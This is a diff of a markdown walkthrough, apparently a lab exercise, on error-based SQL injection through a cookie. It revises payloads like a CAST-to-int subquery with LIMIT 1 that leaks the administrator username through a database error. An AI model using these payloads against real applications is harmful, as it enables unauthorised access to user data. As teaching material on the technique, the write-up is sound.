@@ -31,11 +31,12 @@ SQL syntax is again working and next we can try to extract real data from the da
 
 We get again 'Underminated string error' because the query is too long. Make it shorter by removing some of the cookie hash.
 > f' AND 1=CAST(( SELECT username FROM users) AS int)--
-database gives a new error: 'ERROR: more than one row returned by a subquery used as an expression'
-Database don't know which username to return as there are multiple rows of data.
+
+database gives a new error: 'ERROR: more than one row returned by a subquery used as an expression'<br />
+Database don't know which username to return as there are multiple rows of data.<br />
 To just query one username from database, we need to add *LIMIT* to the query(Different syntax in other database).
 
-> f' AND 1=CAST((SELECT username FROM users) AS int)--
+> f' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 
 And we got the first username from the database, which is the administrator.
 
